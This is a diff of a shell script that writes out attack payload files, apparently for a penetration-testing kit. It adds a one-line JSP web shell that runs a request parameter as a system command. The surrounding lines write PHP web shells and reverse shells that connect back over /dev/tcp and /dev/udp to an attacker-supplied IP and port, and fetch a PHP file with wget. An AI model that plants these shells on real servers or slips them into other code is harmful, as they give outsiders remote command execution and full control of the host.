@@ -52,6 +52,9 @@ echo '<?php passthru($_GET["cmd"]); ?>' > passthru.php
 echo "<?php echo shell_exec(\"bash -i >& /dev/tcp/$source_ip/$source_port 0>&1 2>&1\"); ?>" > shell_reverse_tcp.min.php
 echo "<?php echo shell_exec(\"bash -i >& /dev/udp/$source_ip/$source_port 0>&1 2>&1\"); ?>" > shell_reverse_udp.min.php
 
+banner "payloads_common: simple jsp shells"
+echo "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>" > exec.jsp
+
 banner "payloads_common: wpes.php - https://github.com/weaknetlabs/wpes"
 wget -N https://raw.githubusercontent.com/weaknetlabs/wpes/master/wpes.php
 
